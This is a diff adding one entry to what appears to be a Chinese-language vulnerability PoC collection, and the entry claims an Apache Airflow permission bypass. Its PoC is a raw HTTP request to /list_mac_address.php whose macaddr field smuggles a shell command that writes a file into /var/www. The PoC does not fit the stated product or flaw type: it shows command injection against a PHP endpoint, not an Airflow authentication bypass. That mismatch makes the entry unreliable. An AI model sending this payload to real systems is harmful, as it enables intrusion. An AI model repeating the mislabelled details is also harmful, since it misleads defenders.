@@ -1,0 +1,8 @@
+vendor = "Apache"
+name = "Apache Airflow 存在权限绕过漏洞"
+type = "认证绕过"
+source = "微信"
+info = "Apache Airflow 2.6.0 之前版本"
+date = "08.10"
+poc = "POST /list_mac_address.php HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 72 macaddr=00:00:44:00:00:00;echo 'pwn'>/var/www/pwn.txt&action=0&settype=1"
+label = "1day"
